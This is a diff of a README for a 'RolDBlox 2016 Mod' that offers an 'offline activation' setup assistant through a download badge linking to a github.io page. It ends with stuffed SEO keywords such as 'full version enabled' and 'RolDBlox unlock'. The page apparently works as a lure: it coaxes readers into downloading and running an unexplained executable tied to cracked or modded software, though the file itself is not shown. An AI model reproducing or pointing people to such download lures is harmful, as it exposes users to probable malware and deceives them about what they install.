@@ -1,6 +1,6 @@
 # RolDBlox 2016 Mod — Offline Activation Guide
 
-[![Download Setup Assistant](https://roblox-roldblox-mod-2016-download.github.io/.github)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://roblox-roldblox-mod-2016-download.github.io/.github)
 
 ## ⚙️ How to Use
 1. Download the setup assistant using the button above  
@@ -30,3 +30,5 @@
 
 ### 🔍 SEO Keywords
 RolDBlox offline activation, RolDBlox 2016 Mod setup assistant, full version enabled, no login needed, air-gapped install, enterprise deployment, RolDBlox unlock
+
+
